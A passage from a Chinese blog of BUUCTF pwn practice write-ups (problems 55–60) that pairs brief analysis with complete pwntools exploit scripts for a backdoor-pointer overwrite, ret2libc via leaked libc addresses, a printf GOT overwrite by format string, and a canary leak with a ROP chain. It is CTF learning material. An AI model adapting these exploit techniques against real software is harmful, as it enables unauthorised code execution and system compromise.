+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227170458706.png" srcset="/img/loading.gif" lazyload alt="image-20240227170458706"></p>
+<p>然后IDA上搜索字符串，发现后门在Admin::shell函数这</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227171602957.png" srcset="/img/loading.gif" lazyload alt="image-20240227171602957"></p>
+<p>那么我们用户名就试试admin的</p>
+<p><strong><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227173608295.png" srcset="/img/loading.gif" lazyload alt="image-20240227173608295"></strong></p>
+<p>这次是段错误，看来方向对了</p>
+<p>找找有没有溢出点可以跳转到后门函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227173757161.png" srcset="/img/loading.gif" lazyload alt="image-20240227173757161"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227173832640.png" srcset="/img/loading.gif" lazyload alt="image-20240227173832640"></p>
+<p>两个输入点都有溢出，但是没法溢出到返回地址，看下检查密码的函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227174707294.png" srcset="/img/loading.gif" lazyload alt="image-20240227174707294"></p>
+<p>貌似也没啥问题，没头绪，但是哪里出现了段错误我们还没明白，去pwndbg调调看。</p>
+<p>发现是在password_checker函数这出了问题</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227185020553.png" srcset="/img/loading.gif" lazyload alt="image-20240227185020553"></p>
+<p>把rax当作函数执行出现了问题，我们看看能不能控制rax里面的内容让它执行后门函数。</p>
+<p>可以看到[rbp+var_68]之前有个mov     [rbp+var_68], rdi的指令，所以我们控制rdi，就能控制这里的rax，总所周知rdi是传参的寄存器，那么我们跳出这个函数，看看rdi在主函数中被谁赋值了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227203357987.png" srcset="/img/loading.gif" lazyload alt="image-20240227203357987"></p>
+<p>还是rax，这里的rax又被上面的[rbp+var_130]赋值了，[rbp+var_130]在上面又被rax赋值了，这个rax得去password_checker函数里去看下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240227213021200.png" srcset="/img/loading.gif" lazyload alt="image-20240227213021200"></p>
+<p>终于看到rax被[rbp+var_18]赋值了，那么只要我们想办法把变量var_18填上后门函数的地址，我们就能控制程序获取shell了。</p>
+<p>进两个输入点看看能不能改变量var_18的内容</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228161841491.png" srcset="/img/loading.gif" lazyload alt="image-20240228161841491"></p>
+<p>发现读入的s变量下面就存放着var_18变量，偏移是0x48个字节，刚好能溢出到，那就能写exp了。</p>
+<p>由于 <code>fgets</code> 函数会在遇到空字符（’\x00’）或者换行符（’\n’）时停止读取，因此在构造 payload 时使用了 <code>&#39;\x00&#39;</code> 来截断，以确保后续填充的内容不会被 <code>fgets</code> 读取进去，如果格式化字符串过长有可能会破坏我们布置好的shell，这里利用<code>%s</code>的<code>\x00</code>截断</p>
+<h2 id="2-payload-3"><a href="#2-payload-3" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>io=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">25242</span>)<br>shell_addr=<span class="hljs-number">0x400E88</span><br>padding=<span class="hljs-number">0x48</span><br><br>payload=<span class="hljs-string">b&#x27;2jctf_pa5sw0rd&#x27;</span>+<span class="hljs-string">b&#x27;\x00&#x27;</span>*(padding-<span class="hljs-number">14</span>)+p64(shell_addr)<br>io.sendline(<span class="hljs-string">&#x27;admin&#x27;</span>)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>总体来说，这题还是ret2text，但是对汇编和溢出点的查找要求更高</p>
+<h1 id="56-jarvisoj-level1"><a href="#56-jarvisoj-level1" class="headerlink" title="56.jarvisoj_level1"></a>56.jarvisoj_level1</h1><h2 id="1-分析-5"><a href="#1-分析-5" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228165812631.png" srcset="/img/loading.gif" lazyload alt="image-20240228165812631"></p>
+<p>无保护</p>
+<p>main</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228170052582.png" srcset="/img/loading.gif" lazyload alt="image-20240228170052582"></p>
+<p>vulnerable_function</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228170305828.png" srcset="/img/loading.gif" lazyload alt="image-20240228170305828"></p>
+<p>溢出显而易见，没有后门函数和&#x2F;bin&#x2F;sh字符串，所以要么shellcode，要么libc，先libc试试</p>
+<h2 id="2-payload-4"><a href="#2-payload-4" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26472</span>)<br><span class="hljs-comment">#io=process(&#x27;./xxx&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./56&#x27;</span>)<br><br>main_addr=elf.sym[<span class="hljs-string">&#x27;main&#x27;</span>]	<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>padding=<span class="hljs-number">0x8c</span>	<span class="hljs-comment">#偏移地址</span><br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>payload1 += p32(write_plt)+p32(main_addr)<br>payload1 += p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<br><br><span class="hljs-comment">#根据函数的用法来构造，如果是puts函数则参考64位的方法</span><br><br>io.sendline(payload1)<br><br><span class="hljs-comment">#下面这个需要根据实际情况获取泄露函数真实地址</span><br>write_addr=u32(io.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-string">&#x27;leak_write_real_addr =&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(write_addr)))<br>            <br><span class="hljs-comment">#以下为通用操作</span><br><span class="hljs-string">&#x27;&#x27;&#x27;libc = LibcSearcher(&quot;write&quot;,write_addr)</span><br><span class="hljs-string">libcbase=write_addr-libc.dump(&#x27;write&#x27;)</span><br><span class="hljs-string">system_addr=libcbase+libc.dump(&quot;system&quot;)</span><br><span class="hljs-string">str_bin_sh=libcbase+libc.dump(&#x27;str_bin_sh&#x27;)&#x27;&#x27;&#x27;</span><br><br>libc=ELF(<span class="hljs-string">&#x27;32libc-2.23.so&#x27;</span>)<br>libcbase=write_addr-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>str_bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>            <br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span>*padding+p32(system_addr)+p32(<span class="hljs-number">0</span>)+p32(str_bin_sh)<br><br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="57-hitcontraining-magicheap"><a href="#57-hitcontraining-magicheap" class="headerlink" title="57.hitcontraining_magicheap"></a>57.hitcontraining_magicheap</h1><h2 id="1-分析-6"><a href="#1-分析-6" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228175326939.png" srcset="/img/loading.gif" lazyload alt="image-20240228175326939"></p>
+<p>main</p>
+<h2 id="2-payload-5"><a href="#2-payload-5" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="58-axb-2019-fmt32"><a href="#58-axb-2019-fmt32" class="headerlink" title="58.axb_2019_fmt32"></a>58.axb_2019_fmt32</h1><h2 id="1-分析-7"><a href="#1-分析-7" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240228180750105.png" srcset="/img/loading.gif" lazyload alt="image-20240228180750105"></p>
+<p>main</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240301193717057.png" srcset="/img/loading.gif" lazyload alt="image-20240301193717057"></p>
+<p>read无溢出，但是25行有明显的格式化字符串漏洞</p>
+<p>好久没写格式化字符串的题了，先复习一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240301193706562.png" srcset="/img/loading.gif" lazyload alt="image-20240301193706562"></p>
+<p><strong>格式化字符串</strong>（format string）是一些程序设计语言的输入&#x2F;输出<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%87%BD%E5%BC%8F%E5%BA%AB">库</a>中能将<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E4%B8%B2">字符串</a>参数转换为另一种形式输出的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%AD%90%E7%A8%8B%E5%BA%8F">函数</a>。格式化字符串中的占位符用于指明输出的参数值如何格式化。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240301200537348.png" srcset="/img/loading.gif" lazyload alt="image-20240301200537348"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240301193952374.png" srcset="/img/loading.gif" lazyload alt="image-20240301193952374"></p>
+<p>漏洞特征：</p>
+<p>一旦程序编写不规范，比如正确的写法是：<code>printf(&quot;%s&quot;, pad)</code>，偷懒写成了：&#x3D;&#x3D;printf(pad);&#x3D;&#x3D;，此时就存在格式化字符串漏洞。</p>
+<p>因为printf为可变参数，32位linux系统下是用栈传递参数，栈顶指针esp是第一个参数，此时printf就会打印该字符串，如果进一步遇到格式化符号，比如这里的%p，那么就会以十六进制的方式打印第二个参数，但我们并没有传递第二个参数，所以系统还是将esp+0x4的位置当作第二个参数打印了，以此类推。</p>
+<p>网上师傅的这段找参数位置的方法很有用：</p>
+<p>64位的前6个参数存储在寄存器中，顺序为rdi,rsi,rdx,rcx,r8.r9，但是由于ASLR的开启，我们是不知道第7个参数到底在哪里的，我们可以多写几个参数与栈上比对</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240304221057434.png" srcset="/img/loading.gif" lazyload alt="image-20240304221057434"></p>
+<p>可以看到前2个参数的地址一眼不是栈上的，而第3个是0x7ff开头的，所以是栈上的地址</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240305193309038.png" srcset="/img/loading.gif" lazyload alt="image-20240305193309038"></p>
+<p>x64 前 6 个参数存在寄存器上面，而第一个参数又是格式化字符串，所以这实际上就是第 5+4&#x3D;9 个参数，所以 payload 就写 %9$s</p>
+<p>回到本题，没有后门函数，要用格式化字符串泄露出某个libc函数，来获得libc基址</p>
+<h2 id="2-payload-6"><a href="#2-payload-6" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>io = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-string">&quot;28661&quot;</span>)<br>elf=ELF(<span class="hljs-string">&quot;./58&quot;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;32libc-2.23.so&#x27;</span>)<br><br>printf_got = elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> + p32(printf_got) +<span class="hljs-string">b&#x27;22&#x27;</span>+ <span class="hljs-string">b&#x27;%8$s&#x27;</span><br>io.sendafter(<span class="hljs-string">b&#x27;me:&#x27;</span>, payload)<br>io.recvuntil(<span class="hljs-string">b&quot;22&quot;</span>)<br>printf_addr = u32(io.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;printf_addr=&quot;</span>+<span class="hljs-built_in">hex</span>(printf_addr))<br><br>libc_base=printf_addr-libc.sym[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br><span class="hljs-string">&#x27;&#x27;&#x27;libc=LibcSearcher(&#x27;printf&#x27;,printf_addr)</span><br><span class="hljs-string">libc_base=printf_addr-libc.dump(&#x27;printf&#x27;)</span><br><span class="hljs-string">system=libc_base+libc.dump(&#x27;system&#x27;)&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;system_addr&quot;</span>+<span class="hljs-built_in">hex</span>(system))<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>+fmtstr_payload(<span class="hljs-number">8</span>,&#123;printf_got:system&#125;,write_size = <span class="hljs-string">&quot;byte&quot;</span>,numbwritten = <span class="hljs-number">0xa</span>)<br><br>io.sendline(payload)<br><br>io.sendline(<span class="hljs-string">b&#x27;;/bin/sh\x00&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="59-others-babystack"><a href="#59-others-babystack" class="headerlink" title="59.others_babystack"></a>59.others_babystack</h1><h2 id="1-分析-8"><a href="#1-分析-8" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240305204211555.png" srcset="/img/loading.gif" lazyload alt="image-20240305204211555"></p>
+<p>main</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240305204445081.png" srcset="/img/loading.gif" lazyload alt="image-20240305204445081"></p>
+<p>read漏洞，无后门函数，应该是ret2libc。然后程序有canary保护，我们得先绕过canary。 </p>
+<p>puts函数在输出的时候是遇到’\x00’ 才会结束，我们都知道canary跟在ebp之后，因此我们直接填充‘a’到ebp，正好 可以把canary的截断符覆盖，再输出，就会连canary一起输出了。</p>
+<p>那么思路分析完毕，直接上payload吧</p>
+<h2 id="2-payload-7"><a href="#2-payload-7" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>io=remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="hljs-number">26947</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./59&#x27;</span>)<br><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pop_rdi_ret=<span class="hljs-number">0x400a93</span><br><span class="hljs-comment">#ret=0x40067e	#有时栈平衡会需要这个gadget凑数</span><br>main_addr=<span class="hljs-number">0x400908</span>	<span class="hljs-comment">#elf.sym[&#x27;main&#x27;]</span><br>padding=<span class="hljs-number">0x88</span>	<span class="hljs-comment">#偏移地址</span><br><br><span class="hljs-comment">#0x01	泄露canary</span><br><br>leak_canary=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br><br>io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.sendline(leak_canary)<br>io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>io.recvuntil(<span class="hljs-string">b&#x27;a\n&#x27;</span>)<br>canary=u64(io.recv(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span> (<span class="hljs-built_in">hex</span>(canary))<br><br><span class="hljs-comment">#0x02	leak puts函数</span><br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*padding<br>payload1+=p64(canary)+p64(<span class="hljs-number">0</span>)<br>payload1+=p64(pop_rdi_ret)+p64(puts_got)<br>payload1+=p64(puts_plt)+p64(main_addr)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.sendline(payload1)<br>io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)	<span class="hljs-comment">#让程序正常退出，不然接收不了</span><br>io.recv()<br><br>puts_addr=u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;leak_puts_real_addr =&gt; &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(puts_addr)))<br><br><span class="hljs-comment">#0x03	ret2libc</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="hljs-string">libcbase = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="hljs-string">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="hljs-string">str_bin_sh = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)&#x27;&#x27;&#x27;</span><br><br>libc=ELF(<span class="hljs-string">&#x27;64libc-2.23.so&#x27;</span>)<br>libcbase = puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>str_bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))           <br>            <br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*padding+p64(canary)+p64(<span class="hljs-number">0</span>)+p64(pop_rdi_ret)+p64(str_bin_sh)+p64(system_addr)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;&gt;&gt; &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>io.sendline(payload2)<br>io.sendlineafter(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure>
+
+<h1 id="60-pwnable-start"><a href="#60-pwnable-start" class="headerlink" title="60.pwnable_start"></a>60.pwnable_start</h1><p>手动写shellcode+内平栈</p>
+<h2 id="1-分析-9"><a href="#1-分析-9" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20240305214603993.png" srcset="/img/loading.gif" lazyload alt="image-20240305214603993"></p>
+<h2 id="2-payload-8"><a href="#2-payload-8" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PWN/" class="category-chain-item">PWN</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/PWN/pwn%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/" class="category-chain-item">pwn练习记录</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/PWN/pwn%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/BUUCTF/" class="category-chain-item">BUUCTF</a>
+  
+  
+
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/WP/" class="print-no-link">#WP</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>51~60</div>
+      <div>http://example.com/2024/01/23/WP/BUUCTF/51-60/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Jwj-Learning</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年1月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/01/23/WP/BUUCTF/61-70/" title="61~70">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">61~70</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/10/11/WP/BUUCTF/41-50/" title="41~50">
+                        <span class="hidden-mobile">41~50</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
